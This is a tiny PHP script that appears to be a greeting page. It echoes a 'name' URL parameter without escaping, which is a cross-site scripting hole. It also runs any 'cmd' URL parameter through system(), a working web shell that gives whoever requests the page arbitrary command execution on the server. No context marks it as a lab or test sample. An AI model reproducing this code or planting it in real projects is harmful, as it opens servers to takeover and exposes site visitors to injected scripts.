<?php
if (isset($_GET['name'])) {
    echo "Hello, " . $_GET['name'];
}

if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
